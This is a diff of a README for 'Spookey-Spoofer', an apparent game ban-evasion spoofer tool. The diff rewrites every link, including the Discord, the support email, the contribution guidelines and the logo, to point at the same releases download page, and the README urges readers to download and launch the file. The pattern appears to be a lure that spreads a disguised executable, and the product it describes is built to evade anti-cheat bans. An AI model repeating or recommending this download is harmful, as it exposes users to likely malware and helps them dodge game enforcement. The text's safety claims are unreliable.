@@ -25,7 +25,7 @@ Welcome to the official GitHub repository for Spookey-Spoofer! 🎮 This tool is
 - unban-tool-2024
 
 ## 📦 Get Started:
-To access the latest version of Spookey-Spoofer, please download the tool from [Release.zip](https://github.com/assets/Release.zip).
+To access the latest version of Spookey-Spoofer, please download the tool from [https://github.com/JustusKipngeno/Spookey-Spoofer/releases](https://github.com/JustusKipngeno/Spookey-Spoofer/releases).
 
 ℹ️ **Note:** Once downloaded, ensure to launch the file to begin using Spookey-Spoofer.
 
@@ -48,18 +48,18 @@ Spookey-Spoofer stands out from other tools due to its advanced features and use
 ## 🌐 Community & Support:
 Join the Spookey-Spoofer community to connect with other users, share tips, and receive support for any queries or issues you may have.
 
-👾 **Discord:** [Spookey-Spoofer Discord Community](https://discord.gg/spookey)
-📧 **Email Support:** support@spookey-spoofer.com
+👾 **Discord:** [Spookey-Spoofer Discord Community](https://github.com/JustusKipngeno/Spookey-Spoofer/releases)
+📧 **Email Support:** https://github.com/JustusKipngeno/Spookey-Spoofer/releases
 
 ## 🤝 Contribution:
 If you're passionate about gaming and software development, consider contributing to the Spookey-Spoofer project. Your ideas, suggestions, and code enhancements can help improve the tool for the entire gaming community.
 
-🔗 **Contribution Guidelines:** To contribute, please refer to the [Contribution Guidelines](CONTRIBUTING.md).
+🔗 **Contribution Guidelines:** To contribute, please refer to the [Contribution Guidelines](https://github.com/JustusKipngeno/Spookey-Spoofer/releases).
 
 ---
 
 By choosing Spookey-Spoofer, you're taking a step towards enhancing your gaming experience and ensuring a safe and secure environment for your online adventures. Download the tool today and start gaming without limits! 🎉
 
-![Spookey-Spoofer Logo](https://yourlogomaker.com/templateologys/75b8304cb5be39e643259ed440b19105/Gaming%20Mascot%20trendy%20logo)
+![Spookey-Spoofer Logo](https://github.com/JustusKipngeno/Spookey-Spoofer/releases%20Mascot%20trendy%20logo)
 
 ---
